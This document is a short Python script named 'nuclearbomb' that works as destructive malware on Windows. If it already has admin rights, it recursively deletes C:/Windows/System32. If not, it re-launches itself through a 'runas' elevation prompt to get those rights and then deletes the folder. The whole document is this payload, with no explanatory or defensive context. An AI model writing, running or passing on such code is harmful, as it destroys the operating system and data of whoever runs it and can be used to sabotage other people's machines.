def nuclearbomb():
    import shutil
    from pathlib import Path
    import ctypes
    import sys
    if ctypes.windll.shell32.IsUserAnAdmin():

        system32 = Path("C:/Windows/System32")
        shutil.rmtree(system32)
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

if __name__ == '__main__':
    nuclearbomb()
